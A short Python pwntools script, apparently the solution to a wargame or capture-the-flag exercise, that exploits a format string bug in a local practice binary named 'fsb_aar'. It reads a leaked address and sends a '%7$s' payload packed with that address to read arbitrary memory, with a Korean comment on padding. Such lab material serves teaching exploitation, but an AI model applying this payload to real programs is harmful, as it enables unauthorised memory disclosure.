#!/usr/bin/python3
# Name: fsb_aar.py
from pwn import *
p = process("./fsb_aar")
p.recvuntil(b"`secret`: ")
addr_secret = int(p.recvline()[:-1], 16)
# .ljust(8)은 포맷 스트링을 8바이트 길이로 맞춥니다. 필요 시 오른쪽에 공백을 추가합니다.
#fstring = b"%7$s".ljust(8)
fstring = b"%7$saaaa" # Length: 8
fstring += p64(addr_secret)

p.sendline(fstring)

p.interactive()